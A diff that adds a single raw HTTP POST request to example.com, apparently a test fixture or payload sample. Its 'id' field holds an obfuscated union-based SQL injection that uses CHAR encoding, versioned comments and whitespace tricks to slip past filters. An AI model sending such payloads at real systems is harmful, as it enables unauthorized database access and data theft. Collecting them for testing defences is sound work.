@@ -1,0 +1,9 @@
+POST /profile HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
+Accept: */*
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 125
+
+id=%27%250bCHAR%2897%2C110%2C100%29%25091%3D0%2509/%2A%2149456union%2A//%2A%2A//%2A%2123947select%2A//%2A%2A/1%2C2%2C3%250b--
